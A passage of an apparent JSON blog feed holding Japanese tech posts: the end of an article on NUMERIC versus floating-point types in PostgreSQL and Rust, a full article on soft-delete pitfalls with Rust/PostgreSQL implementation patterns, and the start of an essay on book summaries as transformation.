ストレージ効率が良い（8バイト固定）欠点:- 小数部の桁数が固定- 乗除算後に桁調整が必要パフォーマンスとストレージの比較 型  ストレージ  演算速度  正確性  REAL  4バイト  最速（FPU）  近似  DOUBLE PRECISION  8バイト  高速（FPU）  近似  BIGINT  8バイト  高速（整数演算）  正確  NUMERIC(10,2)  約9バイト  遅い（ソフトウェア）  正確  NUMERIC(19,4)  約13バイト  遅い  正確 大量データの集計ではFLOATが10〜100倍高速になることもあります。しかし、正確性が必要な時はNUMERICを使用してください。実践例ハイブリッドアプローチ-- 生データはFLOAT、集計結果はNUMERICCREATE TABLE sensor_data (    id BIGSERIAL PRIMARY KEY,    reading DOUBLE PRECISION NOT NULL,    recorded_at TIMESTAMPTZ NOT NULL);CREATE TABLE daily_summary (    date DATE PRIMARY KEY,    avg_reading NUMERIC(10, 4) NOT NULL,  -- 集計は正確に    min_reading NUMERIC(10, 4) NOT NULL,    max_reading NUMERIC(10, 4) NOT NULL);-- 集計時にNUMERICへ変換INSERT INTO daily_summarySELECT    DATE(recorded_at),    AVG(reading)::NUMERIC(10, 4),    MIN(reading)::NUMERIC(10, 4),    MAX(reading)::NUMERIC(10, 4)FROM sensor_dataGROUP BY DATE(recorded_at);生成列で自動計算CREATE TABLE invoices (    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),    subtotal NUMERIC(10, 2) NOT NULL,    tax_rate NUMERIC(5, 4) NOT NULL DEFAULT 0.10,    -- 自動計算される生成列    tax_amount NUMERIC(10, 2) GENERATED ALWAYS AS (        ROUND(subtotal * tax_rate, 2)    ) STORED,    total NUMERIC(10, 2) GENERATED ALWAYS AS (        subtotal + ROUND(subtotal * tax_rate, 2)    ) STORED);座標データの精度CREATE TABLE locations (    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),    name VARCHAR(200) NOT NULL,    -- DOUBLE PRECISIONで十分（15桁 > 必要な7桁）    latitude DOUBLE PRECISION NOT NULL,    longitude DOUBLE PRECISION NOT NULL,    -- 高精度が必要な場合のみNUMERIC    survey_latitude NUMERIC(11, 8),   -- 1mmレベルの精度    survey_longitude NUMERIC(12, 8),    CONSTRAINT valid_coords CHECK (        latitude BETWEEN -90 AND 90 AND        longitude BETWEEN -180 AND 180    ));座標の精度と実距離の対応を以下に示します。 小数点の桁数  精度  2桁  約1.1km  4桁  約11m  6桁  約11cm  8桁  約1.1mm rust_decimalの制限事項 項目  rust_decimal  PostgreSQL NUMERIC  最大値  約7.9\xd71028  10131072 - 1  最小スケール  10^-28  10^-16383  ストレージ  16バイト固定  可変長 PostgreSQLからの読み込み時に範囲外の値があるとエラーになります。非常に大きな精度が必要な時はbigdecimalクレートを検討してください。チェックリストスキーマ設計時[ ] FLOATを使う前に「近似値で本当に問題ないか」を確認[ ] 金額・税率・割引率にはNUMERIC/DECIMALを使用[ ] precision/scaleは将来の拡張を考慮して設定[ ] 座標データは用途に応じた精度を選択[ ] センサーデータはセンサー精度を考慮して型を選択Rust実装時[ ] 正確な計算にはrust_decimalを使用[ ] f64の等価比較にはapproxクレートを使用[ ] 丸め戦略を明示的に指定[ ] f64からDecimalへの変換は避ける（文字列経由で）おわりに冒頭で触れたテストの失敗は、金額カラムをNUMERIC(10, 2)に変更することで解消した。修正自体は数分で終わった。型の選択を間違えなければ、そもそも起きなかった問題だ。この記事で見てきたように、浮動小数点の誤差はコンピュータの本質的な制約であり、避けることはできない。しかし、対処法はシンプルだ。金額にはNUMERIC、センサーデータにはFLOAT、迷ったらNUMERIC。スキーマ設計の段階でこの判断ができれば、テストで奇妙な小数を見ることはなくなる。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。参考資料PostgreSQL Numeric TypesIEEE 754 Floating-Point StandardThe Floating-Point Guiderust_decimal crateapprox crateWhat Every Programmer Should Know About Floating-PointFloating Point Numbers and Decimal in Go","isoDate":"2025-12-25T10:27:51.000Z","dateMiliSeconds":1766658471000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"The Pillars of Intelligence: 5 Essential Reading for Every ML Engineer","link":"https://daisuke1024akagawa.medium.com/the-pillars-of-intelligence-5-essential-reading-for-every-ml-engineer-a8cfee9be015?source=rss-c54ac439ad2b------2","isoDate":"2025-12-24T02:43:38.000Z","dateMiliSeconds":1766544218000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"論理削除という技術的負債、それでも僕たちは使い続ける","link":"https://syu-m-5151.hatenablog.com/entry/2025/12/24/110101","contentSnippet":"はじめに「論理削除？deleted_atカラム追加すればいいでしょ」この一言から始まる地獄を、何度見てきただろうか。最初は簡単に見える。カラムを1つ追加するだけ。しかし、その「簡単さ」こそが罠だ。論理削除は技術的負債の温床だ。WHERE句への条件追加忘れ、認知コストの増大、テストの複雑化、パフォーマンス劣化。すべては「最初にドメインを考えなかった」ツケである。しかし現実として、サービスを運用していくと論理削除が必要になる場面は確実に訪れる。論理削除の本質は、「このレコードは存在するが、存在しないことにしてほしい」という矛盾だ。この矛盾を解消するか、受け入れて安全に管理するか。本記事ではその両方のアプローチを解説する。なお、私はDBのスペシャリストではないので、ここで紹介する方法が唯一の正解というわけではない。あくまで一つのアプローチとして参考にしてほしい。データベース設計は文脈次第で最適解が変わるため、「この記事に書いてあったから」ではなく、自分のプロジェクトに合うかどうかで判断してほしい。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。論理削除の何が問題なのかWHERE句地獄最も分かりやすい問題。すべてのクエリに AND deleted_at IS NULL を書く必要がある。-- 単純なSELECTSELECT * FROM users WHERE id = 1 AND deleted_at IS NULL;-- JOINするたびに増えるSELECT *FROM orders oINNER JOIN users u ON o.user_id = u.id AND u.deleted_at IS NULLINNER JOIN products p ON o.product_id = p.id AND p.deleted_at IS NULLWHERE o.deleted_at IS NULL;-- サブクエリでも忘れずにSELECT *FROM usersWHERE id IN (    SELECT user_id FROM orders WHERE deleted_at IS NULL)AND deleted_at IS NULL;書き忘れたらどうなるか？削除したはずのデータが表示される。テストでは気づかない。本番で発覚する。深夜に電話が鳴る。JOINが増えるほど、フィルタも増える──────────────────────────────────────────────────────────  SELECT * FROM orders        │        ├──▶ WHERE orders.deleted_at IS NULL        ← 1個目        │        ├──▶ JOIN users        │         └──▶ AND users.deleted_at IS NULL  ← 2個目        │        ├──▶ JOIN products        │         └──▶ AND products.deleted_at IS NULL ← 3個目        │        └──▶ JOIN categories                  └──▶ AND categories.deleted_at IS NULL ← 4個目  テーブルが増えるたびに、書き忘れのリスクも増える認知コストの増大「このテーブル、論理削除だっけ？物理削除だっけ？」この確認が、すべてのクエリを書くたびに発生する。// このクエリ、deleted_atの条件入ってる？let users = sqlx::query_as!(User, \\"SELECT * FROM users WHERE status = \'active\'\\")    .fetch_all(pool)    .await?;// レビュアー「deleted_atのフィルタ抜けてませんか？」// 作者「あ、このテーブルは物理削除です」// レビュアー「どこに書いてあります？」// 作者「...」ドキュメントに書いてあっても読まれない。コメントに書いてあっても見落とす。レビュアーの認知負荷が高い設計は、チーム規模が拡大するほど事故率が上がる。一意制約の崩壊論理削除を導入した瞬間、一意制約が意味をなさなくなる。-- emailはユニークであるべきCREATE TABLE users (    id UUID PRIMARY KEY,    email VARCHAR(255) UNIQUE,    deleted_at TIMESTAMPTZ);-- ユーザーAがemail \\"test@example.com\\" で登録-- ユーザーAを論理削除-- ユーザーBが同じemail \\"test@example.com\\" で登録しようとする-- → UNIQUE制約違反！解決策はあるが、どれも美しくない。-- 案1: 部分インデックス（PostgreSQL）CREATE UNIQUE INDEX idx_users_email_active ON users(email) WHERE deleted_at IS NULL;-- 案2: 削除済みは別の値にするUPDATE users SET email = email || \'_deleted_\' || id WHERE id = $1;-- 案3: 複合ユニーク制約CREATE UNIQUE INDEX idx_users_email ON users(email, COALESCE(deleted_at, \'9999-12-31\'));どれを選んでも「なぜこんなことをしているのか」を説明するコストが発生する。外部キー制約との相性の悪さ-- ordersはusersを参照するCREATE TABLE orders (    id UUID PRIMARY KEY,    user_id UUID REFERENCES users(id),    deleted_at TIMESTAMPTZ);-- ユーザーを論理削除UPDATE users SET deleted_at = NOW() WHERE id = $1;-- 問題: ordersからは削除されていないuserへの参照が残る-- deleted_at IS NULLでフィルタすると、関連データが取得できないSELECT o.*, u.nameFROM orders oINNER JOIN users u ON o.user_id = u.id AND u.deleted_at IS NULLWHERE o.deleted_at IS NULL;-- → ユーザーが論理削除されると、その注文も見えなくなる（意図した動作？）「削除されたユーザーの注文はどう扱うべきか」という問いに、論理削除は答えを持っていない。データベースが提供する整合性保証を、アプリケーションコードで再実装する羽目になる。カスケード削除との相性が最悪-- 物理削除用に設計されたスキーマCREATE TABLE orders (    id UUID PRIMARY KEY,    user_id UUID REFERENCES users(id) ON DELETE CASCADE);-- 論理削除を導入すると...UPDATE users SET deleted_at = NOW() WHERE id = $1;-- → ordersは削除されない（CASCADEはDELETEにしか反応しない）-- → 「削除された」ユーザーの注文が残り続けるパフォーマンス問題論理削除されたレコードが増えるほど、テーブルは肥大化する。パーシャルインデックスで対処できる。しかし、これも「論理削除を選んだがゆえの追加コスト」だ。-- 10年運用したサービス-- 全レコード: 100万件-- 有効レコード: 10万件-- 削除済みレコード: 90万件-- すべてのクエリが90万件のゴミをスキャンする可能性があるSELECT * FROM users WHERE email = \'test@example.com\' AND deleted_at IS NULL;CREATE INDEX idx_users_email_active ON users(email) WHERE deleted_at IS NULL;テストの複雑化#[tokio::test]async fn test_get_active_users() {    // 有効なユーザーを作成    let active_user = create_user(&pool, \\"active@example.com\\").await;    // 削除済みユーザーを作成    let deleted_user = create_user(&pool, \\"deleted@example.com\\").await;    soft_delete_user(&pool, deleted_user.id).await;    // テスト対象    let users = get_all_users(&pool).await;    // 削除済みが含まれていないことを確認    assert!(!users.iter().any(|u| u.id == deleted_user.id));}// このテストを書き忘れると、バグが本番に流出する// すべてのクエリに対して、このテストが必要deleted_at vs is_deleted：どちらを選ぶべきか論理削除の実装には2つの方式がある。-- 方式1: タイムスタンプ（deleted_at）deleted_at TIMESTAMPTZ  -- NULLなら有効、値があれば削除済み-- 方式2: ブールフラグ（is_deleted）is_deleted BOOLEAN DEFAULT FALSE  -- falseなら有効、trueなら削除済みdeleted_at を推奨する理由：「いつ削除されたか」という情報が自動的に残る監査ログとして機能する「30日以上前に削除されたデータをアーカイブ」といった処理が書きやすいis_deleted のメリット：シンプルで直感的インデックスが小さくなる（BOOLEAN vs TIMESTAMPTZ）NULLの扱いを考えなくてよい（deleted_at IS NULL vs is_deleted = false）私の経験では deleted_at が主流だ。削除日時の情報は運用・デバッグで頻繁に必要になる。ただし、削除日時が不要でパフォーマンスを最優先するなら is_deleted も選択肢になる。RustのORMには論理削除サポートがないRustのORMは、論理削除の組み込みサポートを持たない。// SeaORM - 論理削除の組み込みサポートなしlet users = User::find().all(&db).await?;// deleted_atのフィルタは手動で追加する必要があるlet users = User::find()    .filter(user::Column::DeletedAt.is_null())    .all(&db)    .await?;// 毎回書く必要がある。書き忘れてもコンパイルは通る。// Diesel - 同様に組み込みサポートなしlet users = users::table    .filter(users::deleted_at.is_null())    .load::<User>(&mut conn)?;// sqlx - 生SQLなので当然サポートなしlet users = sqlx::query_as!(User,    \\"SELECT * FROM users WHERE deleted_at IS NULL\\").fetch_all(pool).await?;Rustは「暗黙の動作」より「明示的なコード」を好む文化がある。論理削除フィルタが自動適用されるのは便利だが、何が起きているか分かりにくくなる。そのため、RustのORMは意図的にこの機能を持たないとも解釈できる。しかし、Dieselには diesel-softdelete というコミュニティcrateが存在する。// diesel-softdelete の使用例use diesel_softdelete::SoftDelete;// soft_find: findと同等だが、削除済みを自動除外let user = users::table.soft_find(user_id).first(&mut conn)?;// soft_inner_join: JOINのON句に削除フィルタを適用let posts = posts::table    .soft_inner_join(users::table)    .load(&mut conn)?;SeaORMには同様のcrateは存在しない。現実として、Rustでは論理削除を自分で安全に実装する必要がある。本記事で紹介する6つのパターンは、この課題に対する解決策だ。Linterで防げないのか「WHERE句の書き忘れ、Linterで検出できないの？」という疑問は当然だ。結論から言うと、難しい。SQLFluff（SQLリンター）の限界SQLFluffでカスタムルールを書くことは可能だが、根本的な問題がある。# .sqlfluff - カスタムルールの例[sqlfluff:rules]# 「deleted_at IS NULL を含まないSELECTを警告」というルールを書きたい# しかし...どのテーブルが論理削除対象か、Linterは知らないJOINの場合、どのテーブルにフィルタが必要か判定できないサブクエリの中まで追跡するのは複雑www.sqlfluff.comsqlx のコンパイル時チェックの限界sqlxはコンパイル時にSQLの構文と型をチェックするが、「論理削除フィルタがあるか」はチェックしない。// これはコンパイルが通る（deleted_at フィルタなし）let users = sqlx::query_as!(User, \\"SELECT * FROM users WHERE status = \'active\'\\")    .fetch_all(pool)    .await?;理論的には可能だが、コストが高いProc Macroで独自のクエリマクロを作れば、検出は可能だ。// 理論上のカスタムマクロsoft_query_as!(User, \\"SELECT * FROM users WHERE status = \'active\'\\")// → コンパイルエラー: \\"deleted_at IS NULL\\" が含まれていませんしかし、これを実装・保守するコストは高い。テーブルごとの論理削除設定、JOIN時の挙動、サブクエリの処理など、考慮すべきことが多い。結論：Linterより「ミスできない設計」Linterは「ミスを検出する」アプローチだ。しかし、論理削除の問題は「そもそもミスできない設計」で解決した方が確実だ。RLSやビューを使えば、アプリケーション側でフィルタを書き忘れても、データベースが守ってくれる。Linterで「書き忘れを検出する」より、「書き忘れても問題ない」設計の方が堅牢だ。www.postgresql.orgなぜそれでも論理削除を選ぶのかここまで問題を挙げてきた。それでも論理削除が選ばれ続ける理由を以下に示す。「削除」は本当に削除ではないビジネスの世界では、「削除」は「なかったこと」にすることではない。経理: 「この取引、間違いだったので削除してください」開発者: （物理削除を実行）経理: 「監査が来たとき、削除した取引の履歴を見せてください」開発者: 「...」法規制、監査対応、コンプライアンス。データを完全に消すことが許されないケースは多い。誤操作からの復旧ユーザー: 「間違えて投稿を削除してしまいました。復旧できますか？」物理削除なら「できません」。論理削除なら「できます」。この違いはサポートコストとユーザー満足度に直結する。関連データの整合性-- ユーザーを物理削除すると...DELETE FROM users WHERE id = $1;-- 関連する注文履歴はどうする？-- ON DELETE CASCADE で連鎖削除？→ 売上データが消える-- ON DELETE SET NULL で孤児にする？→ 「誰の注文かわからない」データが残る論理削除なら、関連データの整合性を保ったまま「削除扱い」にできる。分析・デバッグ用途-- なぜこのユーザーは退会したのか？SELECT * FROM users WHERE deleted_at IS NOT NULL ORDER BY deleted_at DESC;-- 削除前の状態を確認したいSELECT * FROM posts WHERE id = $1;  -- 削除済みでも見れる物理削除されたデータは、永遠に失われる。論理削除の本当の問題ここまでの問題点を整理すると、論理削除の本当の問題が見えてくる。それは「削除」という概念を、データモデルとして表現していないことだ。deleted_at カラムは、「このレコードは存在するが、存在しないことにしてほしい」という矛盾した状態を表現している。この矛盾が、すべての問題の根源だ。まず代替手段を検討せよここまで論理削除の問題を散々挙げてきた。では、どうすればいいのか。答えは状況によって異なる。まず、自分がどの状況にいるかを確認しよう。状況A: 新規設計の場合論理削除を使わない選択肢がある。代替手段を検討すべきだ。状況B: 既存システムの場合すでに deleted_at が導入されたテーブルが100個あるなら、今日明日で変えられるわけがない。事故を防ぐ仕組みで覆うしかない。本セクションでは状況Aの代替手段を、次のセクションでは状況Bの安全な実装パターンを解説する。新規設計なら、より良い選択肢がある。Archive テーブルパターン（推奨）削除されたデータを別テーブルに移動する、最もシンプルな代替手段。-- 本番テーブル（有効なデータのみ）CREATE TABLE users (    id UUID PRIMARY KEY,    name VARCHAR(100),    email VARCHAR(255) UNIQUE  -- 一意制約が正常に機能);-- アーカイブテーブル（削除済みデータ）CREATE TABLE archived_users (    id UUID PRIMARY KEY,    name VARCHAR(100),    email VARCHAR(255),  -- UNIQUEなし    archived_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),    archived_by UUID,    archive_reason TEXT);-- 削除時のトランザクションBEGIN;INSERT INTO archived_users (id, name, email, archive_reason)SELECT id, name, email, \'user_requested\' FROM users WHERE id = $1;DELETE FROM users WHERE id = $1;COMMIT;メリット:本番テーブルはシンプルなまま一意制約、外部キー制約が正常に機能WHERE句地獄から解放アーカイブテーブルは別ストレージに配置可能デメリット:復元時にデータ移動が必要スキーマ変更時に両テーブルの更新が必要Temporal Tables（履歴テーブル）SQL:2011で標準化された機能。PostgreSQL 9.2+、SQL Server 2016+、MariaDB 10.3+でサポート。-- PostgreSQLでのTemporal Table（拡張機能を使用）CREATE TABLE users (    id UUID PRIMARY KEY,    name VARCHAR(100),    email VARCHAR(255),    valid_from TIMESTAMPTZ NOT NULL DEFAULT NOW(),    valid_to TIMESTAMPTZ NOT NULL DEFAULT \'infinity\');-- 過去の状態を参照SELECT * FROM usersWHERE id = $1  AND valid_from <= \'2024-01-15\'  AND valid_to > \'2024-01-15\';メリット:変更履歴が自動的に保存される「誰が」「いつ」「何を」変更したか追跡可能通常のクエリには影響なしデメリット:テーブルサイズが急速に増大（高頻度更新テーブルでは問題）複数テーブル間の相関は追跡できないEvent Sourcing状態ではなく「イベント」を保存する設計パターン。#[derive(Debug)]pub enum UserEvent {    Created { id: Uuid, name: String, email: String },    Updated { id: Uuid, name: Option<String>, email: Option<String> },    Deleted { id: Uuid, reason: String },    Restored { id: Uuid },}// イベントを順番に適用して現在の状態を再構築fn rebuild_user(events: &[UserEvent]) -> Option<User> {    let mut user: Option<User> = None;    for event in events {        match event {            UserEvent::Created { id, name, email } => {                user = Some(User { id: *id, name: name.clone(), email: email.clone(), deleted: false });            }            UserEvent::Deleted { .. } => {                if let Some(ref mut u) = user { u.deleted = true; }            }            UserEvent::Restored { .. } => {                if let Some(ref mut u) = user { u.deleted = false; }            }            // ...        }    }    user.filter(|u| !u.deleted)}メリット:完全な監査ログ（ビジネスコンテキスト含む）任意の時点の状態を再現可能デバッグが容易デメリット:学習コストが高い読み取りパフォーマンスの課題（スナップショットが必要）既存システムへの導入が困難PostgreSQL パーティショニング大量データの削除が必要な場合、パーティショニングが有効。-- 月別パーティションテーブルCREATE TABLE events (    id UUID,    created_at TIMESTAMPTZ NOT NULL,    data JSONB) PARTITION BY RANGE (created_at);-- パーティションを作成CREATE TABLE events_2024_01 PARTITION OF events    FOR VALUES FROM (\'2024-01-01\') TO (\'2024-02-01\');CREATE TABLE events_2024_02 PARTITION OF events    FOR VALUES FROM (\'2024-02-01\') TO (\'2024-03-01\');-- 古いデータの削除: DELETEではなくDROPDROP TABLE events_2023_01;  -- 瞬時に完了、VACUUMも不要メリット:大量削除が一瞬（DROP TABLE）VACUUM負荷なしパーティションプルーニングで検索も高速デメリット:パーティションキーの設計が重要管理の複雑さ（pg_partman等のツール推奨）選択フローチャートRustで論理削除を安全に実装する6つのパターン代替手段を検討した上で、それでも論理削除が必要な場合。ここからは、Rustの型システムとPostgreSQLの機能を活用して、論理削除を安全に実装する具体的なパターンを紹介する。パターン1：Newtype Patternで状態を型として表現する最もRustらしいアプローチ。「有効なデータ」と「削除済みデータ」を別の型として定義する。use chrono::{DateTime, Utc};use sqlx::PgPool;use uuid::Uuid;/// 有効なユーザー（削除されていない）#[derive(Debug, sqlx::FromRow)]pub struct ActiveUser {    pub id: Uuid,    pub name: String,    pub email: String,    pub created_at: DateTime<Utc>,}/// 削除済みユーザー#[derive(Debug, sqlx::FromRow)]pub struct DeletedUser {    pub id: Uuid,    pub name: String,    pub email: String,    pub deleted_at: DateTime<Utc>,}impl ActiveUser {    /// 有効なユーザーを1件取得    pub async fn find_by_id(        pool: &PgPool,        id: Uuid,    ) -> Result<Option<Self>, sqlx::Error> {        sqlx::query_as!(            Self,            r#\\"            SELECT id, name, email, created_at            FROM users            WHERE id = $1 AND deleted_at IS NULL            \\"#,            id        )        .fetch_optional(pool)        .await    }    /// 論理削除を実行    pub async fn soft_delete(pool: &PgPool, id: Uuid) -> Result<bool, sqlx::Error> {        let result = sqlx::query!(            r#\\"            UPDATE users            SET deleted_at = NOW(), updated_at = NOW()            WHERE id = $1 AND deleted_at IS NULL            \\"#,            id        )        .execute(pool)        .await?;        Ok(result.rows_affected() > 0)    }}メリット：通常のコードパスでは削除済みデータに触れることが型的に不可能削除済みデータへのアクセスが明示的になるコンパイル時に安全性が保証されるパターン2：トレイトで共通インターフェースを定義する複数のエンティティで論理削除を扱う場合、トレイトで共通化する。use async_trait::async_trait;#[async_trait]pub trait SoftDeletable: Sized {    type Id;    async fn find_active(pool: &PgPool, id: Self::Id) -> Result<Option<Self>, sqlx::Error>;    async fn all_active(pool: &PgPool) -> Result<Vec<Self>, sqlx::Error>;    async fn soft_delete(pool: &PgPool, id: Self::Id) -> Result<bool, sqlx::Error>;    async fn restore(pool: &PgPool, id: Self::Id) -> Result<bool, sqlx::Error>;}// ジェネリックな関数での利用async fn list_active<T: SoftDeletable>(pool: &PgPool) -> Result<Vec<T>, sqlx::Error> {    T::all_active(pool).await}パターン3：PostgreSQLビューで安全なデフォルトを作るデータベース側で「安全なデフォルト」を定義する。-- マイグレーション: 有効データのみを返すビューを作成CREATE VIEW active_users ASSELECT id, name, email, created_at, updated_atFROM usersWHERE deleted_at IS NULL;-- パーシャルインデックスで検索を高速化CREATE INDEX idx_users_active ON users(id) WHERE deleted_at IS NULL;impl ActiveUser {    /// ビューから取得（削除済みは絶対に含まれない）    pub async fn all(pool: &PgPool) -> Result<Vec<Self>, sqlx::Error> {        sqlx::query_as!(            Self,            \\"SELECT id, name, email, created_at, updated_at FROM active_users\\"        )        .fetch_all(pool)        .await    }}メリット：Rustコードでフィルタを忘れる心配がない他の言語やツール（psql、DBeaver等）からも安全JOINでも自動的にフィルタが適用されるパターン4：行レベルセキュリティ（RLS）で強制フィルタリングPostgreSQLのRLSを使って、データベースレベルで論理削除フィルタを強制する。-- 行レベルセキュリティを有効化ALTER TABLE users ENABLE ROW LEVEL SECURITY;-- デフォルトポリシー：削除済みは見えないCREATE POLICY users_active_only ON users    FOR SELECT    USING (        deleted_at IS NULL        OR current_setting(\'app.include_deleted\', true) = \'true\'    );/// 通常のクエリ（削除済みは自動的に除外される）pub async fn get_all_users(pool: &PgPool) -> Result<Vec<User>, sqlx::Error> {    sqlx::query_as!(User, \\"SELECT id, name, email FROM users\\")        .fetch_all(pool)        .await    // RLSにより、deleted_at IS NULLのレコードのみが返される}/// 削除済みを含める場合（明示的な設定が必要）pub async fn get_all_users_including_deleted(pool: &PgPool) -> Result<Vec<UserWithStatus>, sqlx::Error> {    let mut tx = pool.begin().await?;    sqlx::query(\\"SET LOCAL app.include_deleted = \'true\'\\")        .execute(&mut *tx)        .await?;    let users = sqlx::query_as!(UserWithStatus, \\"SELECT id, name, email, deleted_at FROM users\\")        .fetch_all(&mut *tx)        .await?;    tx.commit().await?;    Ok(users)}パターン5：リポジトリパターンで抽象化するレイヤードアーキテクチャでの実装パターン。#[async_trait]pub trait ReadRepository<T, Id> {    async fn find(&self, id: Id) -> Result<Option<T>, RepositoryError>;    async fn all(&self) -> Result<Vec<T>, RepositoryError>;    async fn exists(&self, id: Id) -> Result<bool, RepositoryError>;}#[async_trait]pub trait WriteRepository<T, Id>: ReadRepository<T, Id> {    type CreateInput;    type UpdateInput;    async fn create(&self, input: Self::CreateInput) -> Result<T, RepositoryError>;    async fn update(&self, id: Id, input: Self::UpdateInput) -> Result<T, RepositoryError>;    async fn delete(&self, id: Id) -> Result<bool, RepositoryError>; // 論理削除}リポジトリの実装内部で常に deleted_at IS NULL を適用することで、利用側はフィルタを意識する必要がなくなる。パターン6：マクロで定型コードを削減する毎回同じパターンを書くのは面倒なので、マクロで自動生成する。macro_rules! impl_soft_deletable {    ($struct:ident, table = $table:literal, id_type = $id_type:ty) => {        impl $struct {            pub async fn find_active(pool: &PgPool, id: $id_type) -> Result<Option<Self>, sqlx::Error> {                // 実装            }            pub async fn soft_delete(pool: &PgPool, id: $id_type) -> Result<bool, sqlx::Error> {                // 実装            }            pub async fn restore(pool: &PgPool, id: $id_type) -> Result<bool, sqlx::Error> {                // 実装            }        }    };}// 使用例impl_soft_deletable!(Comment, table = \\"comments\\", id_type = Uuid);パターン比較 パターン  型安全性  実装コスト  DB依存  推奨シーン  Newtype Pattern  高  中  低  型を重視するプロジェクト  トレイト抽象化  高  中〜高  低  複数エンティティがある場合  ビュー  中  低  高  シンプルなCRUD、多言語環境  RLS  高  中  高  マルチテナント、厳格なセキュリティ  リポジトリ  高  高  低  大規模プロジェクト、DDD  マクロ  中  低  低  定型コードを減らしたい 運用のベストプラクティス6つのパターンを紹介したが、どれか1つを選べば終わりではない。実際の運用では、これらを組み合わせて使う。そして、どのパターンを選んでも共通して守るべきルールがある。すべての対策を講じた上で、それでも deleted_at 方式を選ぶなら、以下を徹底する。必須チェックリスト□ ビューを作成し、アプリはビュー経由でアクセス□ パーシャルインデックスを作成□ リポジトリパターンで抽象化□ 削除済みデータのテストを全クエリに追加□ 定期的なアーカイブ処理を実装必ずビューを作るCREATE VIEW active_users AS SELECT * FROM users WHERE deleted_at IS NULL;アプリケーションは active_users にしかアクセスしない。必ずリポジトリパターンを使うpub trait UserRepository {    async fn find(&self, id: Uuid) -> Result<Option<User>, Error>;  // 常に有効のみ}必ずテストを書く#[test]fn deleted_users_are_not_returned() { /* ... */ }すべてのクエリに対して、このテストを義務化する。必ずパーシャルインデックスを作るCREATE INDEX idx_users_email_active ON users(email) WHERE deleted_at IS NULL;パフォーマンス劣化を最小限に抑える。必ず定期的にアーカイブする-- 1年以上前に削除されたデータをアーカイブテーブルに移動INSERT INTO archived_usersSELECT * FROM usersWHERE deleted_at < NOW() - INTERVAL \'1 year\';DELETE FROM usersWHERE deleted_at < NOW() - INTERVAL \'1 year\';本番テーブルの肥大化を防ぐ。おわりに論理削除の本質は、「このレコードは存在するが、存在しないことにしてほしい」という矛盾だ。この矛盾を無視して deleted_at を追加すると、WHERE句地獄、認知コスト、バグの温床という形で跳ね返ってくる。しかし、法規制・監査・誤操作復旧のため、論理削除が必要になる場面は確実に訪れる。そのとき、2つの選択肢がある。矛盾を解消する設計（Archiveテーブル、Event Sourcing）を選ぶか、矛盾を受け入れて型システムとデータベース機能で安全に管理するか。本記事ではRustの型システムとPostgreSQLの機能を活用した安全な実装パターンを紹介した。ただし、データベース設計は文脈次第で最適解が変わる。ここで紹介した方法が唯一の正解ではないので、自分のプロジェクトの要件に照らし合わせて判断してほしい。参考リンクAvoiding the soft delete anti-pattern - 論理削除がアンチパターンになる理由Soft Deletion Probably Isn\'t Worth It - 論理削除の代替手段の検討The Day Soft Deletes Caused Chaos - 論理削除が引き起こした実際の障害事例diesel-softdelete - DieselのためのSoft Delete拡張Soft deletion with PostgreSQL - PostgreSQLでの論理削除実装Beyond DELETE: Drop Partitions, Not Performance - パーティショニングによる削除最適化Temporal Tables and Event Sourcing - 代替アプローチの比較参考書籍達人に学ぶDB設計徹底指南書 第2版作者:ミック翔泳社Amazon達人に学ぶSQL徹底指南書 第2版 初級者で終わりたくないあなたへ作者:ミック翔泳社Amazon失敗から学ぶRDBの正しい歩き方 Software Design plus作者:曽根 壮大技術評論社AmazonSQLアンチパターン 第2版 ―データベースプログラミングで陥りがちな失敗とその対策作者:Bill Karwinオーム社Amazonセンスの良いSQLを書く技術　達人エンジニアが実践している３５の原則作者:ミックKADOKAWAAmazon","isoDate":"2025-12-24T02:01:01.000Z","dateMiliSeconds":1766541661000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"NeMo Guardrails: Putting the “Responsible” in AI","link":"https://daisuke1024akagawa.medium.com/nemo-guardrails-putting-the-responsible-in-ai-ef7e0bfffea0?source=rss-c54ac439ad2b------2","isoDate":"2025-12-23T12:02:25.000Z","dateMiliSeconds":1766491345000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"書評や要約は「圧縮」ではなく「変換」であり、「変換」に価値がある。","link":"https://syu-m-5151.hatenablog.com/entry/2025/12/23/111651","contentSnippet":"タイトルがそのままゴールなのですがダラダラ書きます。はじめにある技術書の要約を読んで、「なるほど、この本の主張はこういうことか」と納得した。数ヶ月後、原著を手に取って驚いた。要約で「核心」とされていた部分は、実は本全体の一部に過ぎなかった。著者が本当に伝えたかったことは、要約では一行も触れられていなかったのだ。技術書、非技術書に限らず、書評や要約を読んでいると、ある違和感に気づく。これは「圧縮」ではなく、本質的に異なるものではないか。原著者の思考プロセスは消失し、要約者のフィルタリングと優先度により情報が再構成される。同じ本から異なる要約が生まれる。そのコンテキストを知らずに読むと、原典でなく要約者の思想を取り込んでしまう。これはデジタル圧縮に例えるなら、可逆圧縮ではなく非可逆変換だ。ZIPファイルのように元に戻せる圧縮ではなく、JPEGのように一度変換すれば二度と元には戻らない変換。情報は永久に失われ、何を残して何を捨てるかは、変換アルゴリズム——この場合は要約者——の判断に依存する。でもここで誤解してほしくないのは、これは要約や書評を否定する話ではないということだ。むしろ、その本質を正しく理解し、積極的に活用するための話だ。要約や書評は「圧縮」ではなく「変換」であり、その変換には独自の価値がある。原著の劣化コピーではなく、原著から触発された新しい思考の産物として。原著への入り口として、あるいは原著と対話する形で展開される考察として。そしてその価値を最大限に引き出すには、私たちが変換というプロセスを意識し、批判的に読み、創造的に使いこなす必要がある。同時に、本当に大切な本については、時間をかけてちゃんと読む——その価値を見失わないことも重要だ。なぜなら、本をちゃんと読むことは、自分を長い時間をかけて変容させることだから。そしてその変容は、要約では決して起きないから。圧縮という幻想私たちは「要約」という言葉を、まるでファイルの圧縮のように捉えている。元の情報を小さくしただけ、重要な部分だけを取り出しただけ、だから本質は変わらない——そう思い込んでいる。しかし本当は違う。デジタルの世界には二つの圧縮がある。ZIPファイルのような可逆圧縮と、JPEGのような非可逆変換。前者は展開すれば元に戻るが、後者は一度変換すれば二度と元には戻らない。情報は永久に失われ、何を残して何を捨てるかは、変換アルゴリズムの設計思想に依存する。書評